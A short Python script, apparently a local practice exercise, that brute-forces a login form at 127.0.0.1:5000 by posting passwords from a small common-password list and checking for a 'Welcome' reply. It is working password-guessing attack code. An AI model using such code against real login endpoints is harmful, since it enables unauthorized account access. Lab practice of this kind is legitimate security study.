import requests


def brute_force_sim(url, username, wordlist):
    for password in wordlist:
        response = requests.post(
            url,
            data={
                "username": username,
                "password": password
            },
            timeout=5
        )

        if "Welcome" in response.text:
            print(f"[+] PASSWORD FOUND: {password}")
            return password

        print(f"[-] Failed: {password}")

    print("[-] Password not found.")
    return None


wordlist = [
    "123456",
    "password",
    "admin",
    "letmein",
    "password123"
]

brute_force_sim(
    "http://127.0.0.1:5000/login",
    "admin",
    wordlist
)